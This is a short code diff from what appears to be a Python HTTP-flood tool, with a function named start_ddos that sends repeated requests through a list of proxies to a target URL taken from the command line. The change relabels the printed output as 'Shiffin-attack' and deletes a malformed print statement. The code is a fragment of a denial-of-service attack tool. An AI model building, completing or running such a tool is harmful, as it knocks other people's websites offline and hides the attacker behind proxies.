@@ -67,14 +67,13 @@ def start_ddos(prox, url, headers, proxies, color):
 		s = r.Session()
 		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
-			print(color+"{}".format(prox))
+			print(color+"Shiffin-attack {}".format(prox))
 	except:
 		pass
 
 @click.command()
 @click.option('--proxy', '-p', help="File with a proxy")
 @click.option('--url', '-u', help="URL")
-print({Fore.WHITE}Shiffin {Fore.WHITE} Attack {Fore.WHITE} Http-proxy {Fore.WHITE} +str(url)+ ))
 def main(proxy, url):
 	
 	if url == None:
